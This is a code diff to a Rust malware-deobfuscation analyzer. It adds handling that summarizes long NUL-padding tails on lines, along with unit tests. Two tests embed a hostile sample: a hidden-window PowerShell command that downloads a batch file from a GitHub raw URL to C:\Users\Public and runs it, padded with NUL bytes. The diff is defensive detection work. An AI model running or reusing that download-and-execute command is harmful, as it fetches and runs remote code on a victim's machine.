@@ -2856,8 +2856,14 @@ pub fn analyze(input: &[u8], cfg: &Config) -> Report {
         profile_mark!("summarize_rem_comments");
         out = summarize_binary_noise_line_runs(&out, &mut env);
         profile_mark!("summarize_binary_noise");
+        out = summarize_nul_padding_lines(&out, &mut env);
+        profile_mark!("summarize_nul_padding");
         let raw_text = String::from_utf8_lossy(input);
-        deob_scan::scan_embedded_powershell_invocations(&raw_text, &mut env);
+        let raw_text_for_embedded = {
+            let mut scratch = env.clone();
+            summarize_nul_padding_lines(&raw_text, &mut scratch)
+        };
+        deob_scan::scan_embedded_powershell_invocations(&raw_text_for_embedded, &mut env);
         deob_scan::scan_embedded_powershell_invocations(&out, &mut env);
         deob_scan::scan_renamed_powershell_invocations(&out, &mut env);
         env.all_extracted_ps1
@@ -4192,6 +4198,45 @@ fn summarize_binary_noise_line_runs(text: &str, env: &mut Environment) -> String
     out
 }
 
+fn summarize_nul_padding_lines(text: &str, env: &mut Environment) -> String {
+    const MIN_NUL_PADDING_BYTES: usize = 1024;
+
+    if !text.as_bytes().contains(&0) {
+        return text.to_string();
+    }
+
+    let mut out = String::with_capacity(text.len().min(256 * 1024));
+    for line in text.split_inclusive('\n') {
+        let (body, newline) = split_line_ending(line);
+        let Some(first_nul) = body.as_bytes().iter().position(|&b| b == 0) else {
+            out.push_str(line);
+            continue;
+        };
+        let tail = &body[first_nul..];
+        let nul_count = tail.as_bytes().iter().filter(|&&b| b == 0).count();
+        if tail.len() < MIN_NUL_PADDING_BYTES || nul_count * 100 < tail.len() * 90 {
+            out.push_str(line);
+            continue;
+        }
+
+        let prefix = body[..first_nul].trim_end();
+        if !prefix.is_empty() {
+            out.push_str(prefix);
+            out.push_str("\r\n");
+        }
+        rescue_truncated_urls(tail, body.len(), env);
+        env.traits.push(crate::traits::Trait::LineTruncated {
+            original_len: body.len() as u64,
+        });
+        out.push_str(&format!(
+            "::==== harrington: omitted {} NUL padding bytes ====",
+            tail.len()
+        ));
+        out.push_str(newline);
+    }
+    out
+}
+
 fn flush_binary_noise_run(
     out: &mut String,
     pending: &mut String,
@@ -4902,6 +4947,61 @@ mod line_cap_tests {
                 .any(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src == url)),
             "URL hidden in summarized binary-looking tail should be rescued: {:?}",
             report.traits
+        );
+    }
+
+    #[test]
+    fn long_nul_padded_command_line_preserves_prefix_and_summarizes_tail() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        let cmd = "powershell.exe -windowstyle hidden C:\\Users\\Public\\okokok.bat;";
+        let text = format!("{cmd}{}\r\n", "\0".repeat(4096));
+
+        let summarized = crate::summarize_nul_padding_lines(&text, &mut env);
+
+        assert!(
+            summarized.contains(cmd),
+            "command prefix should be preserved:\n{}",
+            summarized
+        );
+        assert!(
+            summarized.contains("harrington: omitted 4096 NUL padding bytes"),
+            "NUL tail should be summarized:\n{}",
+            summarized
+        );
+        assert!(
+            !summarized.contains('\0'),
+            "NUL padding should not survive into deob output"
+        );
+    }
+
+    #[test]
+    fn nul_padded_raw_powershell_line_does_not_extract_binary_child_payload() {
+        let mut script = Vec::new();
+        script.extend_from_slice(b"\xff\xff\r\n");
+        script.extend_from_slice(
+            b"powershell.exe -windowstyle hidden Invoke-WebRequest -URI https://raw.githubusercontent.com/kylianjacky27/newprj/main/batchcode/hoang2 -OutFile C:\\Users\\Public\\okokok.bat;\r\n",
+        );
+        script.extend_from_slice(
+            b"powershell.exe -windowstyle hidden C:\\Users\\Public\\okokok.bat;",
+        );
+        script.extend(std::iter::repeat(0).take(4096));
+        script.extend_from_slice(b"\r\n");
+
+        let report = analyze(&script, &Config::default());
+
+        assert!(
+            !report
+                .deobfuscated
+                .contains("harrington: extracted child payload"),
+            "NUL-padded raw scan should not synthesize child payload:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report
+                .deobfuscated
+                .contains("harrington: omitted 4096 NUL padding bytes"),
+            "NUL tail should be summarized:\n{}",
+            report.deobfuscated
         );
     }
 }
